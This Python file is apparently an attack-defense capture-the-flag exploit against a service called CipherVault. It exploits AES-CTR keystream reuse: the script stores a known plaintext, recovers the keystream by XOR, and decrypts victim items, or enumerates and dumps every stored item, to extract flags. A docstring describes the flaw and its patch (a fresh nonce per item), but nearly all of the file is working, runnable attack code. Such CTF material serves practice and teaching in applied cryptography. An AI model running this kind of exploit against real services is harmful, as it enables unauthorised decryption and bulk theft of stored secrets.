"""Exploit for the CipherVault (crypto) service — AES-CTR keystream reuse.

Vulnerability: the service encrypts every item with AES-CTR under a KEY and a
NONCE both fixed once at process start (NONCE = b"\\x00"*8). AES-CTR is a stream
cipher, so identical (KEY, NONCE) means an identical keystream for every item —
the classic many-time-pad mistake. GET /api/item/<id> publicly returns the raw
ciphertext (and GET /api/items enumerates every id), with no token.

Attack: store our own known plaintext, read its ciphertext, recover the
keystream KS = P XOR C, then decrypt any target item C_flag XOR KS. flag_id is
the victim item id; if it is None we enumerate /api/items and dump everything.

Patch (defense): use a fresh random nonce per item and store it beside the
ciphertext (see services/crypto/solution.md). Distinct nonces ⇒ distinct
keystreams ⇒ recovery of one tells you nothing about another.

Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = victim item id
Deps: requests.
"""
import re
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 7
KNOWN = b"A" * 256                 # long enough to cover any 32-byte flag ciphertext

# Keystream is stable for a service process's lifetime -> cache per box; a service
# restart changes KEY, so we self-heal (drop + re-recover) if a decrypt yields nothing.
_KS = {}


def _recover_ks(base):
    try:
        r = requests.post(base + "/api/store",
                          json={"owner": "a", "secret": KNOWN.decode()}, timeout=TIMEOUT)
        known_id = r.json()["id"]
        r = requests.get(base + "/api/item/%s" % known_id, timeout=TIMEOUT)
        ct = bytes.fromhex(r.json()["ciphertext"])
    except Exception:
        return None
    return bytes(a ^ b for a, b in zip(KNOWN, ct))


def _decrypt(base, item_id, ks):
    try:
        r = requests.get(base + "/api/item/%s" % item_id, timeout=TIMEOUT)
        ct = bytes.fromhex(r.json()["ciphertext"])
    except Exception:
        return []
    pt = bytes(a ^ b for a, b in zip(ct, ks)).decode("utf-8", "ignore")
    return FLAG_RE.findall(pt)


def exploit(host, port, flag_id):
    base = "http://%s:%d" % (host, port)
    key = (host, port)
    flags, seen = [], set()
    try:
        ks = _KS.get(key) or _recover_ks(base)
        if not ks:
            return flags
        _KS[key] = ks

        if flag_id is not None:
            targets = [str(flag_id).strip()]
        else:
            # no id given -> enumerate and dump every item
            try:
                items = requests.get(base + "/api/items", timeout=TIMEOUT).json().get("items", [])
            except Exception:
                items = []
            targets = [str(it.get("id")) for it in items if isinstance(it, dict) and it.get("id")]

        for tid in targets:
            got = _decrypt(base, tid, ks)
            if not got and flag_id is not None and _KS.get(key) is ks:
                # cached keystream may be stale (service restarted) -> re-recover once
                fresh = _recover_ks(base)
                if fresh:
                    _KS[key] = fresh
                    ks = fresh
                    got = _decrypt(base, tid, ks)
            for m in got:
                if m not in seen:
                    seen.add(m)
                    flags.append(m)
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 5002
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
